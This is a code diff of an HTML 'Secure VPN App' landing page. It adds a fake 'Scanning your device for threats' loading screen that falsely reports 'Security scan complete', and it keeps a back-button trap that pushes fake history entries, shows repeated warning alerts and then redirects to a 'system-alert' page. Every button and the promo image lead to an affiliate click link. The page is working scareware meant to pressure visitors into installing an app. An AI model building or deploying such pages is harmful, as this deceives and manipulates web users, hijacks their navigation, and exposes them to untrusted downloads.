@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secure VPN App</title>
   <style>
     body {
@@ -12,10 +12,12 @@
       font-family: Arial, sans-serif;
       color: #ffffff;
       text-align: center;
+      overflow: hidden;
     }
 
     .container {
       padding: 20px;
+      display: none; /* Hidden until loading screen disappears */
     }
 
     .vpn-link {
@@ -59,18 +61,63 @@
     #exitAttempts {
       display: none;
     }
+
+    /* FAKE LOADING SCREEN */
+    .loading-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #000000;
+      color: #00ff99;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      z-index: 9999;
+    }
+
+    .loading-bar {
+      width: 80%;
+      height: 10px;
+      background-color: #222;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+
+    .loading-bar-fill {
+      width: 0%;
+      height: 100%;
+      background-color: #00ff99;
+      animation: fillBar 5s linear forwards;
+    }
+
+    @keyframes fillBar {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Clickable Image -->
+
+  <!-- FAKE LOADING SCREEN -->
+  <div class="loading-screen" id="loadingScreen">
+    <div id="loadingText">Scanning your device for threats...</div>
+    <div class="loading-bar">
+      <div class="loading-bar-fill"></div>
+    </div>
+  </div>
+
+  <!-- MAIN LANDING PAGE -->
+  <div class="container" id="mainContent">
     <a class="vpn-link" 
        href="https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
        target="_blank">
       <img src="https://files.catbox.moe/52ox56.jpg" alt="VPN Promo Image" class="vpn-image">
     </a>
 
-    <!-- Breathing Install Button -->
     <a class="install-btn" 
        href="https://www.smallvalue.guru/click?offer_id=29716&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
        target="_blank">
@@ -81,15 +128,23 @@
       100% Free • Fast & Secure Connection • Only 22.3MB
     </div>
 
-    <div id="exitAttempts" style="display: none;"></div>
+    <div id="exitAttempts"></div>
   </div>
 
   <script>
+    // Fake loading screen logic
+    setTimeout(() => {
+      document.getElementById('loadingScreen').style.display = 'none';
+      document.getElementById('mainContent').style.display = 'block';
+      document.body.style.overflow = 'auto';
+      document.getElementById('loadingText').textContent = 'Security scan complete.';
+    }, 5000);
+
+    // Exit trap script (unchanged except for final redirect)
     let attempts = 0;
     const maxAttempts = 4;
     const exitAttemptsText = document.getElementById('exitAttempts');
 
-    // Push two fake history entries for stronger trap
     history.pushState(null, null, location.href);
     history.pushState(null, null, location.href);
 
@@ -111,32 +166,11 @@
 
       if (attempts <= maxAttempts) {
         alert(`⚠️ ${warnings[attempts - 1]}`);
-
-        const alertBox = document.querySelector('.alert-box');
-        if (alertBox) {
-          alertBox.style.animation = 'none';
-          alertBox.offsetHeight;
-          alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
-        }
-
-        const style = document.createElement('style');
-        style.textContent = `
-          @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            60% { transform: translateX(-10px); }
-            80% { transform: translateX(10px); }
-          }
-        `;
-        document.head.appendChild(style);
       } else {
-        // ✅ Redirect to new prelander after final back press
         window.location.href = "https://system-alert.netlify.app/";
       }
     }
 
-    // Prevent scroll bounce
     document.addEventListener('touchmove', function(e) {
       e.preventDefault();
     }, { passive: false });
